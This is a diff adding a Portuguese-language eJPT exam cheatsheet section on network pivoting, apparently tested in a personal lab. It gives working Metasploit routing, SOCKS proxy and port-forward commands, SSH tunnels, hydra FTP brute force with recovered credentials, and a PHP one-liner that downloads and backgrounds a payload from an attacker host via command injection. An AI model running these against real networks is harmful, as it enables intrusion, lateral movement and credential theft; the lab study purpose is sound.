@@ -749,6 +749,150 @@ nc -lvnp 4444
 ```
 Hoje a conexão voltou e o shell respondeu `id`, `hostname` e `pwd`. Botão é `Upload` (U maiúsculo).
 
+---
+
+# ADENDO 12/NOV — PIVOTING VALIDADO PONTA A PONTA (e as 3 armadilhas medidas)
+
+Este é o único bloco do cheatsheet em que a cadeia inteira foi **provada com IP de origem**,
+não só "o comando rodou sem erro". Leia antes do exame: pivoting é obrigatório no eJPT.
+
+## H.1 — `autoroute` SÓ funciona com meterpreter
+
+Medido hoje, mensagem literal do msf:
+
+```
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: shell. This module works with: meterpreter.
+```
+
+Consequência prática: sessão de `ssh_login`, webshell ou `nc` é **shell**. Nela, `autoroute` recusa.
+
+```bash
+# caminho certo: ter meterpreter primeiro
+sessions -l                  # confirme Type = meterpreter
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 10.10.20.0
+set NETMASK 255.255.255.0
+run                          # -> [+] Route added to subnet 10.10.20.0/255.255.255.0
+route print                  # prova visual da rota
+```
+
+## H.2 — `route add` em sessão shell ACEITA a rota e NÃO roteia TCP
+
+Isso custa o exame inteiro se você confiar no "Route added". Medido hoje:
+
+```
+route add 172.20.0.0 255.255.0.0 1
+[*] Route added                # <-- mentira operacional
+```
+
+O tráfego continuou saindo **do IP do atacante**, não do pivô (confirmado no log do alvo).
+Regra: **rota só vale em meterpreter.** Em shell, o que funciona é:
+- usar o próprio shell como cliente (`curl`/`wget` de dentro dele), ou
+- subir meterpreter naquele host, ou
+- `ssh -D` se você tiver credencial SSH **e** o sshd permitir forwarding (ver H.4).
+
+## H.3 — `socks_proxy` + proxychains: funciona, mas nmap snap não é injetado
+
+Depois de `autoroute` com meterpreter:
+
+```bash
+# no msfconsole, com a sessão em background
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+```
+
+Teste que **prova** o túnel (não só "conectou"):
+
+```bash
+proxychains4 curl -s http://172.20.0.3:8081/     # -> corpo da resposta
+proxychains4 nc -zv -w3 172.20.0.3 8081          # -> OK
+```
+
+Resultado medido: no log do alvo interno, a conexão apareceu como **`172.20.0.4`** (o pivô),
+não `172.20.0.1` (o atacante). **É essa comparação de IP que prova o pivô — faça sempre.**
+
+⚠️ **nmap nesta máquina é snap** → o `LD_PRELOAD` do proxychains não entra no binário confinado.
+O scan "passa" e sai direto do atacante (log mostrou `172.20.0.1`). No **Kali do exame isso não
+acontece** (nmap normal, proxychains funciona). Para treinar aqui: use `curl`/`nc` pelo proxy,
+ou o scanner do próprio msf (`auxiliary/scanner/portscan/tcp`), que respeita a rota.
+
+## H.4 — `ssh -D` no sshd do linuxserver: bloqueado por padrão
+
+```
+channel 2: open failed: administratively prohibited: open failed
+```
+
+`AllowTcpForwarding` vem desligado nessa imagem. Num alvo real com SSHD padrão, o pivô por SSH é
+o mais rápido que existe:
+
+```bash
+sshpass -p 'senha' ssh -D 1080 -N -f user@IP        # SOCKS5 na 1080
+proxychains4 nmap -sT -Pn -p- 10.10.20.10           # tudo pelo túnel
+```
+
+Se aparecer "administratively prohibited": o forwarding está desligado — não insista, use meterpreter.
+
+## H.5 — `portfwd` (meterpreter) — acesso a UM serviço interno
+
+```bash
+# dentro do meterpreter (sessão do host de borda)
+portfwd add -L 127.0.0.1 -l 8080 -r 10.10.20.10 -p 80
+portfwd list
+curl http://127.0.0.1:8080          # serviço interno via localhost do atacante
+```
+
+`portfwd` é alternativa ao SOCKS quando você quer **um** serviço (RDP, HTTP, SMB), sem configurar proxy.
+Não testado nesta máquina hoje (só `autoroute`+`socks_proxy`); a sintaxe é a padrão do meterpreter.
+
+## H.6 — Receita completa do pivô (copiar na ordem)
+
+```bash
+# 1) foothold com meterpreter (web RCE, exploit, handler)
+# 2) descobrir a rede interna
+run get_local_subnets                    # ou: ipconfig / ifconfig no meterpreter
+# 3) rota
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 10.10.20.0
+set NETMASK 255.255.255.0
+run
+route print
+# 4) proxy para ferramentas externas
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+# 5) scan interno
+proxychains4 nmap -sT -Pn -p- 10.10.20.10
+# 6) acesso direto a um serviço
+#    no meterpreter: portfwd add -L 127.0.0.1 -l 8080 -r 10.10.20.10 -p 80
+```
+
+## H.7 — Detalhe do lab: DVWA não tem wget/curl
+
+Para baixar payload no DVWA (RCE por command injection), o container só tem PHP e Perl:
+
+```bash
+php -r 'file_put_contents("/tmp/m",file_get_contents("http://172.30.0.1:8899/m.elf"));'
+chmod +x /tmp/m && nohup /tmp/m >/dev/null 2>&1 &
+```
+
+Foi assim que a sessão meterpreter de hoje abriu. Em alvo real, `wget`/`curl` normalmente existem.
+
+## H.8 — hydra FTP revalidado
+
+```bash
+hydra -L users.txt -P passes.txt -t 4 -f 127.0.0.1 -s 2121 ftp
+# -> [2121][ftp] host: 127.0.0.1  login: msfadmin  password: msfadmin   (1 s)
+```
+
+FTP é o módulo do hydra que funciona aqui. SSH/RDP **não** (sem módulo compilado) — no Kali do exame sim.
+
 
 
 
